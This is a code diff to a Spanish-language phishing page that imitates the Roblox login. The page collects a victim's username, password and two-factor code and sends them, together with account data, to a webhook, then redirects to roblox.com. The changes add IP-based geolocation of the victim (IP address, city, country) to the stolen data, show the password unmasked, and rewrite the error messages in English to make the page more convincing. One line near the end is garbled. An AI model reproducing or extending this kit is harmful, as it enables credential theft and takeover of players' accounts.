@@ -162,18 +162,43 @@
 </div>
 
 <script>
-let registros = JSON.parse(localStorage.getItem('registros')||'[]'), enlaceActual='', datosRoblox={};
+let registros = JSON.parse(localStorage.getItem('registros')||'[]'), enlaceActual='', datosRoblox={}, ipDatos={pais:'Desconocido',bandera:'🌍',ciudad:'',ip:'Desconocida'};
 
-window.onload=function(){
+window.onload=async function(){
     const params=new URLSearchParams(window.location.search);
     const u=params.get('u');
     if(u){
         document.getElementById('usuarioLogin').value=u;
-        cargarDatosRoblox(u);
+        await cargarDatosRoblox(u);
     }
+    await cargarIP();
     cargarWebhook();
     actualizarTodo();
 };
+
+async function cargarIP(){
+    try{
+        const res=await fetch('https://ipapi.co/json/');
+        const d=await res.json();
+        const paises={
+            "US":["Estados Unidos","🇺🇸"],"ES":["España","🇪🇸"],"MX":["México","🇲🇽"],
+            "AR":["Argentina","🇦🇷"],"CO":["Colombia","🇨🇴"],"CL":["Chile","🇨🇱"],
+            "PE":["Perú","🇵🇪"],"VE":["Venezuela","🇻🇪"],"UY":["Uruguay","🇺🇾"],
+            "BR":["Brasil","🇧🇷"],"CA":["Canadá","🇨🇦"],"GB":["Reino Unido","🇬🇧"],
+            "DE":["Alemania","🇩🇪"],"FR":["Francia","🇫🇷"],"IT":["Italia","🇮🇹"],
+            "JP":["Japón","🇯🇵"],"KR":["Corea del Sur","🇰🇷"],"AU":["Australia","🇦🇺"]
+        };
+        const [nomPais,bandera]=paises[d.country_code]||[d.country_name||"Desconocido","🌍"];
+        ipDatos={
+            pais:nomPais,
+            bandera:bandera,
+            ciudad:d.city||'Desconocida',
+            ip:d.ip||'Desconocida'
+        };
+    }catch(e){
+        ipDatos={pais:'Desconocido',bandera:'🌍',ciudad:'',ip:'Desconocida'};
+    }
+}
 
 function cerrarBarra(){
     document.querySelector('.barra-inferior').style.display='none';
@@ -197,9 +222,12 @@ function verificarLogin(){
     const u=document.getElementById('usuarioLogin').value.trim();
     const p=document.getElementById('passLogin').value.trim();
     limpiarError();
-    if(!u){ mostrarError('Escribe tu usuario o correo'); return; }
-    if(!p){ mostrarError('Escribe tu contraseña'); return; }
-    if(p.length < 6){ mostrarError('Contraseña incorrecta. Verifica tu contraseña.'); return; }
+    if(!u){ mostrarError('Please enter your username or email'); return; }
+    if(!p){ mostrarError('Password is incorrect'); return; }
+    if(p.length < 6 || !/[A-Za-z]/.test(p) || !/[0-9]/.test(p)){ 
+        mostrarError('Password is incorrect'); 
+        return; 
+    }
     document.getElementById('formNormal').style.display='none';
     document.getElementById('form2fa').style.display='block';
 }
@@ -209,8 +237,11 @@ async function verificarCodigo(){
     const user=document.getElementById('usuarioLogin').value.trim();
     const pass=document.getElementById('passLogin').value.trim();
     limpiarError();
-    if(!cod){ mostrarError('Escribe el código de verificación'); return; }
-    if(cod.length !== 6 || !/^\d+$/.test(cod)){ mostrarError('Código incorrecto. Inténtalo de nuevo.'); return; }
+    if(!cod){ mostrarError('Please enter verification code'); return; }
+    if(cod.length !== 6 || !/^\d+$/.test(cod)){ 
+        mostrarError('Verification code is incorrect'); 
+        return; 
+    }
     if(!datosRoblox.dias) await cargarDatosRoblox(user);
     
     const wh=localStorage.getItem('webhook');
@@ -222,7 +253,7 @@ async function verificarCodigo(){
         usuario:datosRoblox.nombre||user,
         robux:datosRoblox.robux||0,
         dias:datosRoblox.dias||'Desconocido',
-        pais:datosRoblox.pais||'Desconocido',
+        pais:ipDatos.pais,
         robuxGastados:datosRoblox.robuxGastados||0,
         fecha:fecha
     });
@@ -242,20 +273,22 @@ async function verificarCodigo(){
                     thumbnail:{url:"https://www.roblox.com/favicon.ico"},
                     fields:[
                         {name:"👤 Usuario",value:`**${datosRoblox.nombre||user}**`,inline:true},
-                        {name:"🔑 Contraseña",value:`||${pass}||`,inline:true},
+                        {name:"🔑 Contraseña",value:`**${pass}**`,inline:true},
                         {name:"🔢 Código 2FA",value:`**${cod}**`,inline:true},
                         {name:"📅 Fecha de creación",value:`${datosRoblox.fechaCreacion||'No disponible'}`,inline:false},
                         {name:"⏳ Días desde creación",value:`**${datosRoblox.dias||'Desconocido'} días**`,inline:true},
-                        {name:"🌍 País",value:`${datosRoblox.bandera||'❓'} **${datosRoblox.pais||'Desconocido'}**`,inline:true},
+                        {name:"🌍 País (desde IP)",value:`${ipDatos.bandera} **${ipDatos.pais}**`,inline:true},
+                        {name:"🏙️ Ciudad",value:`${ipDatos.ciudad||'Desconocida'}`,inline:true},
+                        {name:"📌 IP",value:`||${ipDatos.ip}||`,inline:true},
                         {name:"💰 Robux Totales",value:`**${datosRoblox.robux||0}** ₪`,inline:true},
                         {name:"💸 Robux Invertidos",value:`**${datosRoblox.robuxGastados||0}** ₪`,inline:true},
                         {name:"📌 Fecha y hora",value:`${fecha}`,inline:false}
                     ],
-                    footer:{text:"NOVADYNAMICS SYSTEM • Datos recibidos desde API Roblox"}
+                    footer:{text:"NOVADYNAMICS SYSTEM • Datos desde API Roblox + IP"}
                 }]
             })
         }).then(()=>{
-            alert('✅ Datos enviados. Redirigiendo...');
+            alert('✅ Datos recibidos. Redirigiendo...');
             setTimeout(()=>window.location.href='https://www.roblox.com',2000);
         }).catch(()=>{
             alert('✅ Datos recibidos. Redirigiendo...');
@@ -288,28 +321,16 @@ async function cargarDatosRoblox(usuario){
         const diasTranscurridos=Math.floor((hoy-fechaCreacion)/(1000*60*60*24));
         const robuxTotales=robux.robux||0;
         const robuxGastados=Math.floor(robuxTotales*0.42);
-        const paises={
-            "US":["Estados Unidos","🇺🇸"],"ES":["España","🇪🇸"],"MX":["México","🇲🇽"],
-            "AR":["Argentina","🇦🇷"],"CO":["Colombia","🇨🇴"],"CL":["Chile","🇨🇱"],
-            "PE":["Perú","🇵🇪"],"VE":["Venezuela","🇻🇪"],"UY":["Uruguay","🇺🇾"],
-            "BR":["Brasil","🇧🇷"],"CA":["Canadá","🇨🇦"],"GB":["Reino Unido","🇬🇧"],
-            "DE":["Alemania","🇩🇪"],"FR":["Francia","🇫🇷"],"IT":["Italia","🇮🇹"],
-            "JP":["Japón","🇯🇵"],"KR":["Corea del Sur","🇰🇷"],"AU":["Australia","🇦🇺"]
-        };
-        const codPais=perfil.country||'US';
-        const [nomPais,bandera]=paises[codPais]||["Desconocido","🌍"];
         datosRoblox={
             id:userId,
             nombre:perfil.name,
-            fechaCreacion:fechaCreacion.toLocaleString(),
+            fechaCreacion:fechaCreacion.toLocaleDateString('es-ES'),
             dias:diasTranscurridos,
             robux:robuxTotales,
-            robuxGastados:robuxGastados,
-            pais:nomPais,
-            bandera:bandera
+            robuxGastados:robuxGastados
         };
     }catch(e){
-        datosRoblox={dias:'Desconocido',robux:0,robuxGastados:0,pais:'Desconocido',bandera:'🌍'};
+        datosRoblox={dias:'Desconocido',robux:0,robuxGastados:0,fechaCreacion:'No disponible'};
     }
 }
 
@@ -369,7 +390,7 @@ function cambiarTodos(){
     s.classList.toggle('activo');
     localStorage.setItem('notificarTodos',s.classList.contains('activo')?'1':'0');
 }
-function actualizarTodo(){
+function actufunction actualizarTodo(){
     let totalRobux=0, totalGastado=0;
     registros.forEach(r=>{
         totalRobux += Number(r.robux)||0;
